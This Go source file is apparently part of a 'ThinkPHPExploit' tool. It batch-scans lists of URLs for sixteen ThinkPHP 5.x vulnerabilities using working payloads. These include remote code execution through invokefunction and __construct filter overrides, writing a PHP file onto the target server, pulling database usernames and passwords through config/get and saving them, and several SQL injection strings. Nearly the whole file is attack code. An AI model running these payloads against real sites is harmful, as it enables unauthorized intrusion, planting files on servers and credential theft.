package vulScan

import (
	"ThinkPHPExploit/common"
	"ThinkPHPExploit/utils"
	"fmt"
	"strings"
	"sync"
	"time"
)

type Scan struct {
	result []string
	lock   sync.Mutex
}

// thinkphp5.0.x路由过滤不严谨rce漏洞
func (s *Scan) check_5_x_route_rce_get(url string) {
	//defer errorE(url)
	var wg sync.WaitGroup
	poclist := []string{
		"?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
		"?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
		"?s=index/think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
		"?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
	}
	for _, poc := range poclist {
		wg.Add(1)
		payload := url + "/index.php" + poc
		go func(payload string) {
			response := common.GetReq(payload)
			if strings.Contains(response, "PHP Version") {
				defer wg.Done()
				fmt.Printf("[*] %v 存在thinkphp5.0.x路由过滤不严谨rce漏洞\n", url)
				s.lock.Lock()
				s.result = append(s.result, fmt.Sprintf("[*] %v 存在thinkphp5.0.x路由过滤不严谨rce漏洞", url))
				s.lock.Unlock()
				return
			} else {
				defer wg.Done()
				fmt.Printf("[-] %v 不存在thinkphp5.0.x路由过滤不严谨rce漏洞\n", url)
			}

		}(payload)
	}
	wg.Wait()

}

// thinkphp5.x路由过滤不严谨rce漏洞(post型)
func (s *Scan) check_5_x_construct_rce_post(url string) {
	var wg sync.WaitGroup

	poclist := []string{
		"_method=__construct&filter[]=phpinfo&method=GET&get[]=1",
		"s=1&_method=__construct&method=POST&filter[]=phpinfo",
		"aaaa=1&_method=__construct&method=GET&filter[]=phpinfo",
		"c=phpinfo&f=1&_method=filter",
		"_method=__construct&filter[]=phpinfo&server[REQUEST_METHOD]=1",
	}
	url += "?s=index"
	for _, poc := range poclist {
		wg.Add(1)
		go func(url string, poc string) {
			response := common.PostReq(url, poc)
			if strings.Contains(response, "PHP Version") {
				defer wg.Done()
				fmt.Printf("[*] %v 存在thinkphp5.0.x路由过滤不严谨rce漏洞(post)\n", url)
				s.lock.Lock()
				s.result = append(s.result, fmt.Sprintf("[*] %v 存在thinkphp5.0.x路由过滤不严谨rce漏洞(post)", url))
				s.lock.Unlock()
				//fmt.Println("true")
				return
			} else {
				defer wg.Done()
				fmt.Printf("[-] %v 不存在thinkphp5.0.x路由过滤不严谨rce漏洞(post)\n", url)
			}
		}(url, poc)
	}
	wg.Wait()

}

// check_5_x_driver_rce
func (s *Scan) check_5_x_driver_rce(url string) {
	poclist := []string{
		"?s=index/think\\view\\driver\\Php/display&content=<?php phpinfo();?>",
		"?s=index/\\think\\view\\driver\\Php/display&content=<?php phpinfo();?>",
	}
	for _, poc := range poclist {
		payload := url + poc
		response := common.GetReq(payload)
		if strings.Contains(response, "PHP Version") {
			fmt.Printf("[*] %v 存在thinkphp5_driver_rce漏洞\n", url)
			s.lock.Lock()
			s.result = append(s.result, fmt.Sprintf("[*] %v 存在thinkphp5_driver_rce漏洞", url))
			s.lock.Unlock()
			return
		} else {
			continue
		}

	}
	fmt.Printf("[-] %v 不存在thinkphp5_driver_rce漏洞\n", url)
}

// thinkphp5_showid_rce漏洞
func (s *Scan) Check_5_x_showid_rce(url string) {
	poc := "?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~phpinfo()}]"
	response := common.GetReq(url + poc)
	if strings.Contains(response, "PHP Version") {
		fmt.Printf("[*] %v 存在thinkphp5_showid_rce漏洞\n", url)
		s.lock.Lock()
		s.result = append(s.result, fmt.Sprintf("[*] %v 存在thinkphp5_showid_rce漏洞", url))
		s.lock.Unlock()
		return
	} else {
		fmt.Printf("[-] %v 不存在thinkphp5_showid_rce漏洞\n", url)
	}

}

// thinkphp5_request_input_rce漏洞
func (s *Scan) check_5_x_request_input_rce(url string) {
	var wg sync.WaitGroup
	poclist := []string{
		"?s=index/\\think\\Request/input&filter=phpinfo&data=1",
		"?s=index/think\\Request/input&filter=phpinfo&data=1",
	}
	for _, poc := range poclist {
		wg.Add(1)
		payload := url + poc
		go func(payload string) {
			response := common.GetReq(payload)
			if strings.Contains(response, "PHP Version") {
				defer wg.Done()
				fmt.Printf("[*] %v 存在thinkphp5_request_input_rce漏洞\n", url)
				s.lock.Lock()
				s.result = append(s.result, fmt.Sprintf("[*] %v 存在thinkphp5_request_input_rce漏洞", url))
				s.lock.Unlock()
				return
			} else {
				defer wg.Done()
				fmt.Printf("[-] %v 不存在thinkphp5_request_input_rce漏洞\n", url)
			}

		}(payload)
	}
	wg.Wait()

}

// thinkphp5 __construct覆盖变量rce
func (s *Scan) check_5_x_construct_other(url string) {
	var wg sync.WaitGroup
	poclist := []string{
		"_method=__construct&filter[]=phpinfo&method=GET&get[]=1",
		"_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1",
		"s=1&_method=__construct&method=POST&filter[]=phpinfo",
	}
	for _, poc := range poclist {
		wg.Add(1)
		poc_url := url + "/index.php?s=captcha"
		go func(poc_url string, poc string) {
			response := common.PostReq(poc_url, poc)
			if strings.Contains(response, "PHP Version") {
				defer wg.Done()
				fmt.Printf("[*] %v 存在thinkphp5.x_construct_rce漏洞(post型)\n", url)
				s.lock.Lock()
				s.result = append(s.result, fmt.Sprintf("[*] %v 存在thinkphp5.x_construct_rce漏洞(post型)", url))
				s.lock.Unlock()
				return
			} else {
				defer wg.Done()
				fmt.Printf("[-] %v 不存在thinkphp5.x_construct_rce漏洞(post型)\n", url)
			}

		}(poc_url, poc)
	}
	wg.Wait()
}

// thinkphp5.x_template_driver漏洞
func (s *Scan) check_5_x_template_driver_rce(url string) {
	var wg sync.WaitGroup
	poclist := []string{
		"?s=index/\\think\\template\\driver\\file/write&cacheFile=iceberg.php&content=<?php phpinfo();?>",
		"?s=index/think\\template\\driver\\file/write&cacheFile=iceberg.php&content=<?php phpinfo();?>",
	}
	for _, poc := range poclist {
		wg.Add(1)
		pocUrl := url + "/index.php" + poc
		func(pocUrl string) {
			common.GetReq(pocUrl)
			if strings.Contains(common.GetReq(url+"/iceberg.php"), "PHP Version") {
				defer wg.Done()
				fmt.Printf("[*] %v 存在thinkphp5.x_template_driver漏洞\n", url)
				s.lock.Lock()
				s.result = append(s.result, fmt.Sprintf("[*] %v 存在thinkphp5.x_template_driver漏洞", url))
				s.lock.Unlock()
				return
			} else {
				defer wg.Done()
				fmt.Printf("[-] %v 不存在thinkphp5.x_template_driver漏洞\n", url)
			}
		}(pocUrl)
	}
	wg.Wait()
}

// thinkphp5_x_lite_code_rce漏洞
func (s *Scan) check_5_x_lite_code_rce(url string) {
	poc := "/index.php/module/action/param1/${@print(var_dump(iceberg))}"
	pocUrl := url + poc
	response := common.GetReq(pocUrl)
	if strings.Contains(response, "PHP Version") {
		fmt.Printf("[*] %v 存在thinkphp5_lite_code_rce漏洞\n", url)
		s.lock.Lock()
		s.result = append(s.result, fmt.Sprintf("[*] %v 存在thinkphp5_lite_code_rce漏洞", url))
		s.lock.Unlock()
		return
	} else {
		fmt.Printf("[-] %v 不存在thinkphp5_lite_code_rce漏洞\n", url)
	}
}

// thinkphp5.x_cache_rce漏洞
func (s *Scan) check_5_x_cache_rce(url string) {
	pocData := "%0d%0avar_dump('iceberg-N');%0d%0a//"
	pocUrl := url + "/index.php/Home/Index/index.html"
	response := common.PostReq(pocUrl, pocData)
	if strings.Contains(response, "iceberg-N") {
		fmt.Printf("[*] %v 存在thinkphp5.x_cache_rce漏洞\n", url)
		s.lock.Lock()
		s.result = append(s.result, fmt.Sprintf("[*] %v 存在thinkphp5.x_cache_rce漏洞", url))
		s.lock.Unlock()
		return
	} else {
		fmt.Printf("[-] %v 不存在thinkphp5.x_cache_rce漏洞\n", url)
	}
}

// thinkphp5.x数据库泄露
func (s *Scan) check_5_0_x_db(url string) {
	pocList := []string{
		"?s=index/think\\config/get&name=database.username",
		"?s=index/think\\config/get&name=database.password",
	}
	payload_user := url + pocList[0]
	payload_pass := url + pocList[1]
	dbUser := common.GetReq(payload_user)
	dbPass := common.GetReq(payload_pass)
	if dbUser != "" && dbPass != "" && len(dbUser) <= 100 {
		fmt.Printf("[*] %v 存在thinkphp5.x数据库泄露\n", url)
		s.lock.Lock()
		s.result = append(s.result, fmt.Sprintf("[*] %v 存在thinkphp5.x数据库泄露", url))
		s.lock.Unlock()
		s.lock.Lock()
		s.result = append(s.result, fmt.Sprintf("[*] 数据库账号: %v", dbUser))
		s.lock.Unlock()
		s.lock.Lock()
		s.result = append(s.result, fmt.Sprintf("[*] 数据库密码: %v", dbPass))
		s.lock.Unlock()
		return
	} else {
		fmt.Printf("[-] %v 不存在thinkphp5.x数据库泄露\n", url)
	}
}

// thinkphp5sql注入漏洞
func (s *Scan) check_5_x_sql(url string) {
	pocList := []string{
		"s=/home/pay/index/orderid/1%27)UnIoN/**/All/**/SeLeCT/**/HEX('iceberg')--+",
		"ids[0,UpdAtexml(0,ConcAt(0xa,HEX('iceberg')),0)]=1",
	}
	for _, poc := range pocList {
		pocUrl := url + "?" + poc
		response := common.GetReq(pocUrl)
		if strings.Contains(response, "69636562657267") {
			fmt.Printf("[*] %v 存在thinkphp5.xSQL注入漏洞\n", url)
			s.lock.Lock()
			s.result = append(s.result, fmt.Sprintf("[*] %v 存在thinkphp5.xSQL注入漏洞", url))
			s.lock.Unlock()
			return
		} else {
			fmt.Printf("[-] %v 不存在thinkphp5.xSQL注入漏洞\n", url)
		}
	}
}

// thinkphp5.xXFF头SQL注入漏洞
func (s *Scan) check_5_x_xff_sql(url string) {
	poc := "1')And/**/ExtractValue(1,ConCat(0x5c,(sElEct/**/HEX('iceberg'))))#"
	headers := map[string]string{
		"Content-Type":    "application/x-www-form-urlencoded",
		"X-Forwarded-For": poc,
	}
	pocUrl := url + "/index.php?s=/home/article/view_recent/name/1"
	response := common.ZGetReq(pocUrl, headers)
	if strings.Contains(response, "69636562657267") {
		fmt.Printf("[*] %v 存在thinkphp5.xXFF头SQL注入漏洞\n", url)
		s.lock.Lock()
		s.result = append(s.result, fmt.Sprintf("[*] %v 存在thinkphp5.xXFF头SQL注入漏洞", url))
		s.lock.Unlock()
		return
	} else {
		fmt.Printf("[-] %v 不存在thinkphp5.xXFF头SQL注入漏洞\n", url)
	}
}

// thinkphp5.x时间注入漏洞
func (s *Scan) check_5_x_time_sql(url string) {
	poc := "----------546983569\r\nContent-Disposition: form-data; name=\"couponid\"\r\n\r\n1')UniOn SelEct slEEp(10)#\r\n\r\n----------546983569--"
	headers := map[string]string{
		"DNT":             "1",
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"Content-Type":    "multipart/form-data; boundary=--------546983569",
		"Accept-Encoding": "gzip, deflate, sdch",
		"Accept-Language": "zh-CN,zh;q=0.8",
	}
	pocUrl := url + "/index.php?s=/home/user/checkcode/"
	startTime := time.Now()
	common.ZPostReq(pocUrl, poc, headers)
	endTime := time.Since(startTime)
	if endTime >= time.Second*10 {
		fmt.Printf("[*] %v 存在thinkphp5.x时间注入漏洞\n", url)
		s.lock.Lock()
		s.result = append(s.result, fmt.Sprintf("[*] %v 存在thinkphp5.x时间注入漏洞", url))
		s.lock.Unlock()
		return
	} else {
		fmt.Printf("[-] %v 不存在thinkphp5.x时间注入漏洞\n", url)
	}
}

// thinkphp5.x_ids_SQL注入漏洞
func (s *Scan) check_5_x_ids_sql(url string) {
	poc := "?ids[0,UpdAtexml(0,ConcAt(0xa,HEX(iceberg)),0)]=1"
	pocUrl := url + "/index.php" + poc
	response := common.GetReq(pocUrl)
	if strings.Contains(response, "69636562657267") {
		fmt.Printf("[*] %v 存在thinkphp5.x_ids_SQL注入漏洞\n", url)
		s.lock.Lock()
		s.result = append(s.result, fmt.Sprintf("[*] %v 存在thinkphp5.x_ids_SQL注入漏洞", url))
		s.lock.Unlock()
		return
	} else {
		fmt.Printf("[-] %v 不存在thinkphp5.x_ids_SQL注入漏洞\n", url)
	}
}

// thinkphp5.x_orderid_SQL注入漏洞
func (s *Scan) check_5_x_orderid_sql(url string) {
	poc := "?s=/home/pay/index/orderid/1%27)UnIoN/**/All/**/SeLeCT/**/HEX('iceberg')--+"
	pocUrl := url + "/index.php" + poc
	response := common.GetReq(pocUrl)
	if strings.Contains(response, "69636562657267") {
		fmt.Printf("[*] %v 存在thinkphp5.x_orderid_SQL注入漏洞\n", url)
		s.lock.Lock()
		s.result = append(s.result, fmt.Sprintf("[*] %v 存在thinkphp5.x_orderid_SQL注入漏洞", url))
		s.lock.Unlock()
		return
	} else {
		fmt.Printf("[-] %v 不存在thinkphp5.x_orderid_SQL注入漏洞\n", url)
	}
}

// thinkphp5.x_update_SQL注入漏洞
func (s *Scan) check_5_x_update_sql(url string) {
	poc := "?money[]=1123&user=liao&id[0]=bind&id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20HEX('iceberg')),0x7e),1))"
	pocUrl := url + "/index.php" + poc
	response := common.GetReq(pocUrl)
	if strings.Contains(response, "69636562657267") {
		fmt.Printf("[*] %v 存在thinkphp5.x_update_SQL注入漏洞\n", url)
		s.lock.Lock()
		s.result = append(s.result, fmt.Sprintf("[*] %v 存在thinkphp5.x_update_SQL注入漏洞", url))
		s.lock.Unlock()
		return
	} else {
		fmt.Printf("[-] %v 不存在thinkphp5.x_update_SQL注入漏洞\n", url)
	}
}

func StartScan(info common.CmdOptions) {
	var wg sync.WaitGroup
	var tasklist = make(chan string, 1)
	scan := Scan{}
	if info.Url != "" && info.Url != "http://127.0.0.1" {
		fmt.Println("开始扫描:")
		startTime := time.Now()
		tasklist <- strings.Replace(info.Url, " ", "", -1)
		close(tasklist)
		wg.Add(1)
		go addScan(tasklist, &wg, &scan)
		wg.Wait()
		endTime := time.Since(startTime)
		fmt.Println("\n存在漏洞链接:")
		resultNew := utils.RemoveRepeatedElement(scan.result)
		for _, result := range resultNew {
			fmt.Println(result)
			if info.OutFileName == "" {
				continue
			} else {
				utils.OutFile(info.OutFileName, result)
			}
		}
		if info.OutFileName != "" {
			fmt.Printf("\n[*]结果输出保存到: %v", info.OutFileName)
			fmt.Printf("\n[*]扫描结束，共耗时: %v\n", endTime)
			return
		} else {
			fmt.Printf("\n[*]扫描结束，共耗时: %v\n", endTime)
			return
		}

	}

	if info.FileName != "" {
		fmt.Println("开始批量扫描")
		startTime := time.Now()
		scan.scanAll(info)
		endTime := time.Since(startTime)
		if info.OutFileName != "" {
			fmt.Printf("\n[*]结果输出保存到: %v", info.OutFileName)
			fmt.Printf("\n[*]扫描结束，共耗时: %v\n", endTime)
			return
		} else {
			fmt.Printf("\n[*]扫描结束，共耗时: %v\n", endTime)
			return
		}
	}

}

func (s *Scan) scanAll(info common.CmdOptions) {
	var wg sync.WaitGroup
	urls := utils.ReadFile(info.FileName)
	var taskChan = make(chan string, len(urls))
	for _, url := range urls {
		taskChan <- url
	}
	close(taskChan)
	for i := 0; i <= info.Thread; i++ {
		wg.Add(1)
		go addScan(taskChan, &wg, s)
	}
	wg.Wait()

	fmt.Println("\n存在漏洞链接:")
	resultNew := utils.RemoveRepeatedElement(s.result)
	for _, result := range resultNew {
		fmt.Println(result)
		if info.OutFileName == "" {
			return
		} else {
			s.lock.Lock()
			utils.OutFile(info.OutFileName, result)
			s.lock.Unlock()
		}
	}
}

func addScan(ch1 chan string, wg *sync.WaitGroup, s *Scan) {
	defer wg.Done()
	for {
		url, ok := <-ch1
		if !ok {
			break
		}
		s.check_5_x_route_rce_get(url)
		s.check_5_x_construct_rce_post(url)
		s.check_5_x_driver_rce(url)
		s.Check_5_x_showid_rce(url)
		s.check_5_x_request_input_rce(url)
		s.check_5_x_construct_other(url)
		s.check_5_x_template_driver_rce(url)
		s.check_5_x_lite_code_rce(url)
		s.check_5_x_cache_rce(url)
		s.check_5_0_x_db(url)
		s.check_5_x_sql(url)
		s.check_5_x_xff_sql(url)
		s.check_5_x_time_sql(url)
		s.check_5_x_ids_sql(url)
		s.check_5_x_orderid_sql(url)
		s.check_5_x_update_sql(url)
	}
}
